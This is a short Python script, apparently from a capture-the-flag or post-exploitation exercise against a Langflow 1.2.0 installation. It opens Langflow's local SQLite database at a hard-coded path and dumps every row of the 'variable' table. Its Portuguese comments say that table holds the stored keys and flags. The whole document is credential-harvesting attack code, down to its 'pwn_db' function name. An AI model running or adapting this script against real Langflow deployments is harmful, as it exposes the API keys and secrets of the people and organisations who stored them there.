import sqlite3
import os

db_path = '/opt/langflow-1.2.0-venv/lib/python3.12/site-packages/langflow/langflow.db'

def pwn_db():
    if not os.path.exists(db_path):
        print(f"[-] Banco nao encontrado em {db_path}")
        return
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        # Lista todas as tabelas para garantir
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()
        print(f"[+] Tabelas encontradas: {tables}")

        # Busca na tabela variable (onde ficam as chaves e flags)
        cursor.execute("SELECT * FROM variable;")
        rows = cursor.fetchall()
        print("\n--- CONTEUDO DA TABELA VARIABLE ---")
        for row in rows:
            print(row)
            
    except Exception as e:
        print(f"[-] Erro ao ler banco: {e}")

if __name__ == "__main__":
    pwn_db()
